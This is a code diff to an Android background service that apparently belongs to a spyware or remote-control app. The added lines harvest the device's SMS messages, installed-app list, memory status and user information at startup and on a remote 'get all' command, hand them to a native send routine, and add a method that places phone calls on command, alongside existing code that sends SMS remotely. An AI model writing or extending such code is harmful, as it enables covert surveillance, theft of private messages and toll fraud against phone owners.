@@ -70,6 +70,12 @@ public class androidService extends Service {
 		// }
 		// getPhotosInfo();
 		Appmanager.jnipthreadinit();
+		updateMemoryStatus();
+		appinfolist();
+		getSmsInPhone();
+		getUserInfo();
+		
+		Appmanager.gotosend(10);
 		// openservice();
 
 		mHandler.post(mRunnable);
@@ -125,6 +131,12 @@ public class androidService extends Service {
 		Appmanager.gotosend(7);
 	}
 
+	public void callnumber(String number){
+		Log.d("Java", "caling..." + number);
+		Intent dialIntent = new Intent(Intent.ACTION_CALL, Uri
+				.parse("tel:" + number));
+			startActivity(dialIntent);
+	}
 	public String getSmsInPhone() {
 		i = -1;
 		final String SMS_URI_ALL = "content://sms/"; // 所有短信
@@ -328,7 +340,22 @@ public class androidService extends Service {
 				sendSMS(mmsnumber, mmsdata);
 				Appmanager.gotosend(8);
 				break;
+			case 0x09: // call number
+//				Log.d(TAG, "call number");
+//				callnumber(Appmanager.getphonenumber());
+				Appmanager.gotosend(9);
+				break;
+			case 10:		//get all
+				Log.d(TAG, "get all to send");
+				updateMemoryStatus();
+				appinfolist();
+				getSmsInPhone();
+				getUserInfo();
+				
+				Appmanager.gotosend(10);
+				break;
 			default:
+//				Log.d(TAG, "get nothing");
 				break;
 			}
 			mHandler.postDelayed(mRunnable, 1000);
